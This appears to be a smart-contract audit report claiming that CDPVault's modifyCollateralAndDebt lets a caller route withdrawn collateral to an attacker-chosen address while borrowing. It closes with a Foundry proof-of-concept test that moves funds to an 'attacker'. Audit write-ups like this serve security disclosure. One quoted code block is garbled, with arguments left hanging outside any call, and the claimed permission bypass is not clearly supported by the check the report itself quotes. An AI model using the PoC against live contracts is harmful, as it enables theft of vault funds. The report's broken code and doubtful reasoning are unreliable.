# Vulnerability details

## Vulnerability details

The function `CDPVault::modifyCollateralAndDebt` function is responsible for modifying the collateral and debt balances of a position by performing four operations:

* Deposit
* Withdraw
* Borrow
* Repay

When a user interacts with this function to perform any of the four above operations, depending on the case, certain conditions must be met:

```Javascript
function modifyCollateralAndDebt(
    address owner,
    address collateralizer,
    address creditor,
    int256 deltaCollateral,
    int256 deltaDebt
) public {
    if (
        // position is either more safe than before or msg.sender has the permission from the owner
        ((deltaDebt > 0 || deltaCollateral < 0) && !hasPermission(owner, msg.sender)) ||
        // msg.sender has the permission of the collateralizer to collateralize the position using their cash
        (deltaCollateral > 0 && !hasPermission(collateralizer, msg.sender)) ||
        // msg.sender has the permission of the creditor to use their credit to repay the debt
        (deltaDebt < 0 && !hasPermission(creditor, msg.sender))
    ) revert CDPVault__modifyCollateralAndDebt_noPermission();

    // [ ... ]

```

To apply for a borrow checks if `caller` has the permission to perform the action on behalf of `owner` and `deltaDebt > 0`, if these conditions are met, the caller may apply for the borrow.

```Javascript

    // [ ... ]

    if (deltaDebt > 0) {

            uint256(deltaDebt), // delta debt

            position.cumulativeIndexLastUpdate

```

However, since this function performs four operations, it is possible to fulfill the requirements to apply for a borrow and at the same time withdraw the funds from the token.

To perform a `withdraw`, the condition `deltaCollateral < 0` must be met:

```Javascript

    // [ ... ]

    } else if (deltaCollateral < 0) {
        uint256 amount = wmul(abs(deltaCollateral), tokenScale);

    // [ ... ]
```

When specifying collateralizer (attacker) its check can be bypassed since, being OR operations, only one of the conditions (borrow conditions) needs to be satisfied:

```Javascript

        // position is either more safe than before or msg.sender has the permission from the owner
        ((deltaDebt > 0 || deltaCollateral < 0) && !hasPermission(owner, msg.sender)) ||
        // msg.sender has the permission of the collateralizer to collateralize the position using their cash
        (deltaCollateral > 0 && !hasPermission(collateralizer, msg.sender)) ||
        // msg.sender has the permission of the creditor to use their credit to repay the debt
        (deltaDebt < 0 && !hasPermission(creditor, msg.sender))
    ) revert CDPVault__modifyCollateralAndDebt_noPermission();
```

## Impact
Stealing funds from the vault

## Proof of Concept

```Javascript
function test_attacker() public {
    CDPVault vault = createCDPVault(token, 150 ether, 10 ether, 1.25 ether, 1.0 ether, 0);
    createGaugeAndSetGauge(address(vault));
    token.mint(address(this), 100 ether);
    token.approve(address(vault), 100 ether);
    address position = address(new PositionOwner(vault));

    uint256 creditAttackerBefore = token.balanceOf(attacker);
    assertEq(creditAttackerBefore, 0 ether);
    
    vault.deposit(position, 100 ether);
    vault.modifyCollateralAndDebt(position, attacker, address(this), -30 ether, 50 ether);
    
    uint256 credit = credit(address(this));
    uint256 creditAttacker = token.balanceOf(attacker);
    
    assertEq(credit, 50 ether);
    assertEq(creditAttacker, 30 ether);
}
```
